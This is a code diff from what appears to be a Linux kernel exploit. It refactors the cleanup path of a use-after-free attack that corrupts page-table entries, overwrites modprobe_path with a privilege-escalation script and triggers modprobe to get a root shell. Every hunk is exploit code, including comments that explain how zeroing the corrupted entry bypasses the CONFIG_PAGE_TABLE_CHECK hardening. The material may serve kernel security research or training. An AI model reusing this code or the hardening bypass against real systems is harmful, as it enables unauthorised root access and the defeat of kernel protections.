@@ -593,7 +593,7 @@ int main(void)
 	/* Start from the first GiB of physical memory */
 	ret = pud_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
-		goto end;
+		goto repair;
 
 	for (i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
@@ -626,12 +626,12 @@ int main(void)
 		}
 
 		if (modprobe_path_uaddr == NULL)
-			goto repair;
+			break;
 
 		new_len = strlen(privesc_script_path);
 		if (new_len + 1 > KMOD_PATH_LEN) {
 			printf("[-] not enough bytes in modprobe_path\n");
-			goto repair;
+			break;
 		}
 
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
@@ -641,19 +641,19 @@ int main(void)
 		trigger_modprobe_sock();
 		result = EXIT_SUCCESS;
 
-repair:
-		/* 
-		 * Bypass the PAGE_TABLE_CHECK hardening when the page table is freed.
-		 * To do so, we fill the page table entry with zeroes to skip memory freeing
-		 * in do_zap_pte_range() (see pte_none()).
-		 * This ensures that the page_table_check function is never reached for that entry
-		 */
-		act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
-
-		goto end; /* root shell is finished */
+		goto repair; /* root shell is finished */
 	}
 
 	printf("[-] failed to find / overwrite / trigger modprobe\n");
+
+repair:
+	/*
+	 * Bypass the CONFIG_PAGE_TABLE_CHECK on page table freeing.
+	 * To do so, write 0 to the corrupted page table entry
+	 * to make pud_none_or_clear_bad() called in zap_pud_range().
+	 * That allows to skip the checks.
+	 */
+	act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
 
 end:
 	if (act_fd >= 0) {
